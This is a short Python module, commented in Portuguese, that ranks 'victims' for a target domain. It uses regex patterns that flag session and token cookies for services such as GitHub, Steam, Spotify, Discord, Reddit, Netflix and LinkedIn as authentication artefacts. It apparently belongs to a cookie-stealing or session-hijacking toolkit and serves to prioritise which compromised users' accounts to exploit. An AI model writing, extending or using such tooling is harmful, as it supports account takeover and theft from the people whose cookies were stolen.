"""Selecao da melhor vitima para um dominio alvo e heuristica leve de artefato.

Classifica nomes de cookies em auth/anon/other para ordenar vitimas e priorizar
o scoring de artefatos.
"""

from __future__ import annotations

import re

from typing import List, Tuple

# Artefatos de autenticacao/sessao — heuristica ampla por nome.
_AUTH_PATTERNS = [
    r"^session", r"sessid", r"sessionid", r"^sid$", r"^auth",
    r"token$", r"-token$", r"_token$", r"^token=", r"^jwt",
    r"^bearer", r"^refresh", r"^access_token", r"^id_token",
    r"^__host-", r"^__secure-",
    r"^connect\.sid", r"phpsessid", r"aspxauth", r"jsessionid",
    r"^cfjwt", r"^x-main$", r"^ubid-main$", r"^am-token", r"^session-token",
    r"^session-id", r"^at-main$", r"^sso-", r"^nl\.session", r"^udc-main",

    # GitHub
    r"^_octo$", r"^dotcom_user$", r"^logged_in$", r"^saved_user_sessions$",
    r"^_device_id$", r"^user_session$", r"^ghcc$", r"^csrf-token$",
    r"^gh_token$", r"^github_remember_",

    # Steam
    r"^sessionid$", r"^steamLoginSecure$", r"^steamMachineAuth",
    r"^steamCountry$", r"^steamRememberPassword$",

    # Spotify
    r"^sp_", r"^wp_access_token", r"^sp-dcp$", r"^sp-sso$",
    r"^sp_nid$", r"^sp_gaid", r"^sp_last_utm",

    # Discord / Reddit / Twitter-X
    r"^__dcfduid$", r"^__sdcfduid$", r"^__stripe_mid",
    r"^reddit_session$", r"^token_v2$", r"^auth_token$",

    # Netflix / Disney+ / streaming
    r"^nflx", r"^flixsnr", r"^profilesession",
    r"^SecureNetflixId$", r"^netflix_session",

    # Microsoft / LinkedIn / GitHub-style
    r"^MSCC$", r"^MStoken$", r"^MSFPC$", r"^li_at$", r"^liap$",
    r"^bing.com$",
]

# Cookies que quase certamente NAO sao autenticacao.
_ANON_PATTERNS = [
    r"^i18n-prefs", r"^lc-main", r"^lc-main-av", r"^sp-cdn", r"^av-timezone",
    r"^csmt-hit", r"^aws-priv", r"^aws-target-data", r"^optanon",
    r"^amcv", r"^s_vnum", r"^_ga", r"^_gid", r"^_gcl", r"^aam_",
    r"^kndctr_", r"^AMCV_", r"^uetsid", r"^uetvid",
    r"^sc_at", r"^cf_use_ob",
]

_COMPILED_AUTH = [re.compile(p, re.IGNORECASE) for p in _AUTH_PATTERNS]
_COMPILED_ANON = [re.compile(p, re.IGNORECASE) for p in _ANON_PATTERNS]


def classify_name(name: str) -> str:
    name = name or ""
    for pattern in _COMPILED_AUTH:
        if pattern.search(name):
            return "auth"
    for pattern in _COMPILED_ANON:
        if pattern.search(name):
            return "anon"
    return "other"


def is_auth_candidate(name: str) -> bool:
    return classify_name(name) == "auth"


def rank_victims(rows: List[dict]) -> List[Tuple[int, int, int]]:
    ranked = sorted(rows, key=lambda r: (r.get("auth", 0), r.get("total", 0)), reverse=True)
    return [(r["victim_id"], r.get("auth", 0), r.get("total", 0)) for r in ranked]